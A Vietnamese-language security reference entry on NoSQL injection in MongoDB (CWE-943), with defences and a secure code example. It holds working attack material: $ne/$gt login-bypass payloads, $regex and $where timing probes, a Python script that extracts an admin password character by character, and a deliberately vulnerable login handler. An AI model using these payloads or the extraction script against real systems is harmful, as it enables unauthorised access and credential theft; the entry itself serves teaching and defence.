# NoSQL Injection

> **CWE**: CWE-943 | **Phân loại**: Injection

## Kiến thức Nền tảng

Nhiều người thường nghĩ rằng các cơ sở dữ liệu thế hệ mới NoSQL như MongoDB sẽ tuyệt đối an toàn trước các cuộc tấn công injection vì chúng không sử dụng các câu lệnh SQL truyền thống. Tuy nhiên, điều này không hoàn toàn đúng. Thay vì dùng chuỗi văn bản SQL, MongoDB sử dụng các đối tượng dữ liệu JSON/BSON để tìm kiếm và so sánh dữ liệu, đi kèm các ký tự toán tử đặc biệt bắt đầu bằng dấu đô-la (ví dụ: `$eq` để so sánh bằng, `$ne` để so sánh không bằng, hay `$gt` để so sánh lớn hơn).

```javascript
// Normal MongoDB query in Node.js with Mongoose
const mongoose = require('mongoose');

// Find a user by email - standard query
const user = await User.findOne({ email: "alice@example.com" });

// Query with comparison operators
const activeUsers = await User.find({
    status: "active",
    age: { $gte: 18 }      // Age greater than or equal to 18
});

// Authentication query - find user matching both email AND password
const authUser = await User.findOne({
    email: userEmail,
    password: hashedPassword
});
```

Nhiều developer tin rằng NoSQL databases "miễn nhiễm" với injection vì không dùng SQL strings. Đây là **quan niệm sai lầm nghiêm trọng** — NoSQL injection khai thác cơ chế khác: thay vì chèn SQL syntax, attacker chèn **query operators** vào JSON objects.

## Mô tả lỗ hổng

Lỗ hổng NoSQL Injection xảy ra khi ứng dụng web "nhẹ dạ" nhận dữ liệu từ người dùng và đưa thẳng vào câu lệnh tìm kiếm của MongoDB mà không kiểm tra xem dữ liệu đó là một chuỗi văn bản thường hay là một đối tượng chứa các toán tử logic của MongoDB. Kẻ tấn công có thể gửi lên một yêu cầu chứa toán tử `$ne` (không bằng) thay vì một mật khẩu thông thường. Câu hỏi xác thực của ứng dụng sẽ bị biến đổi từ "mật khẩu có trùng khớp không?" thành "hãy tìm người dùng có mật khẩu không phải là rỗng". Kết quả là kẻ tấn công có thể dễ dàng đăng nhập mà không cần biết mật khẩu, vượt qua hệ thống xác thực, hoặc dò tìm và đánh cắp toàn bộ cơ sở dữ liệu của bạn.

## Cơ chế tấn công

### 1. Authentication Bypass

```javascript
// Vulnerable login endpoint
app.post('/login', async (req, res) => {
    const user = await User.findOne({
        username: req.body.username,    // Directly from user input
        password: req.body.password     // Directly from user input
    });
    if (user) {
        res.json({ success: true, token: generateToken(user) });
    }
});
```

```http
# Attack: Send MongoDB operators instead of string values
POST /login HTTP/1.1
Content-Type: application/json

{
    "username": {"$ne": ""},
    "password": {"$ne": ""}
}

# This query becomes: find user where username != "" AND password != ""
# Result: Returns the FIRST user in the database (usually admin)
```

```http
# Alternative: Using $gt operator
POST /login HTTP/1.1
Content-Type: application/json

{
    "username": "admin",
    "password": {"$gt": ""}
}

# password > "" matches ANY non-empty password
# Result: Login as admin without knowing the password
```

### 2. Data Extraction with $regex

```http
# Extract admin password character by character
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$regex": "^a"}}     → 200 OK (starts with 'a')
{"username": "admin", "password": {"$regex": "^ab"}}    → 401 Fail
{"username": "admin", "password": {"$regex": "^a1"}}    → 200 OK (second char is '1')
{"username": "admin", "password": {"$regex": "^a1b"}}   → 200 OK
# Continue until full password is extracted: "a1b2c3d4..."
```

```python
# Automated extraction script
import requests
import string

url = "http://target.com/login"
password = ""
charset = string.ascii_lowercase + string.digits

while True:
    found = False
    for c in charset:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{c}"}
        }
        r = requests.post(url, json=payload)
        if r.status_code == 200:
            password += c
            print(f"Found: {password}")
            found = True
            break
    if not found:
        print(f"Complete password: {password}")
        break
```

### 3. JavaScript Injection with $where

```http
# $where allows arbitrary JavaScript execution on the server
POST /api/users HTTP/1.1
Content-Type: application/json

{
    "username": {"$where": "sleep(5000) || true"}
}

# If response is delayed by 5 seconds, $where injection is confirmed

# Extract data via timing side-channel
{
    "username": {
        "$where": "if(this.password.charAt(0)=='a'){sleep(3000)}; return true"
    }
}
```

## Biện pháp phòng thủ

- **Tóm tắt**: Ép kiểu dữ liệu đầu vào, sử dụng các phương thức truy vấn an toàn của ODM/ORM và làm sạch các toán tử đặc biệt.
- **Các bước chi tiết**:
  - Validate input types: Ép kiểu user input thành `String()` trước khi dùng trong query.
  - Dùng ODM built-in sanitization: Mongoose schema với `type: String` tự động reject objects.
  - Cấm `$where`: Disable JavaScript execution trong MongoDB config.
  - Dùng `mongo-sanitize`: Thư viện strip tất cả keys bắt đầu bằng `$`.
  - Parameterized queries: Dùng Mongoose methods thay vì raw MongoDB driver queries.
  - Rate limiting: Ngăn chặn automated extraction attacks.

## Code Example

```javascript
// ❌ VULNERABLE: Direct user input in MongoDB query
const express = require('express');
const app = express();
app.use(express.json());

app.post('/login', async (req, res) => {
    // req.body.password could be {"$ne": ""} instead of a string
    const user = await db.collection('users').findOne({
        username: req.body.username,
        password: req.body.password   // No type checking!
    });
    if (user) return res.json({ token: createJWT(user) });
    res.status(401).json({ error: "Invalid credentials" });
});
```

```javascript
// ✅ SECURE: Input validation and sanitization
const express = require('express');
const mongoSanitize = require('express-mongo-sanitize');
const app = express();

app.use(express.json());
app.use(mongoSanitize());  // Strip all keys starting with $ from req.body

app.post('/login', async (req, res) => {
    // Explicitly cast to string - objects become "[object Object]"
    const username = String(req.body.username);
    const password = String(req.body.password);

    // Validate input format before querying
    if (!username || !password || username.length > 64 || password.length > 128) {
        return res.status(400).json({ error: "Invalid input" });
    }

    // Use bcrypt comparison instead of DB-level password matching
    const user = await db.collection('users').findOne({ username });
    if (!user || !await bcrypt.compare(password, user.passwordHash)) {
        return res.status(401).json({ error: "Invalid credentials" });
    }

    res.json({ token: createJWT(user) });
});
```

## Xem thêm

- [SQL Injection](../sql-injection/) — Lỗ hổng SQL Injection cổ điển trên các cơ sở dữ liệu quan hệ SQL.

## Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/nosql-injection
- HackTricks – NoSQL Injection: https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html
- CWE-943: https://cwe.mitre.org/data/definitions/943.html
- OWASP Testing Guide – NoSQL Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection

## Giải thích thuật ngữ

- **NoSQL Injection**: Tiêm toán tử truy vấn độc hại vào câu lệnh tìm kiếm NoSQL.
- **JSON/BSON**: Định dạng biểu diễn dữ liệu dạng cặp key-value được sử dụng trong cơ sở dữ liệu NoSQL.
- **Query Operator**: Các toán tử đặc biệt (như `$ne`, `$gt`, `$regex`) dùng để lọc và truy vấn dữ liệu.
- **Object Parser**: Bộ phân tích và biến đổi chuỗi dữ liệu đầu vào thành đối tượng lập trình.
- **Authentication Bypass**: Vượt qua cơ chế kiểm tra đăng nhập để truy cập tài khoản trái phép.
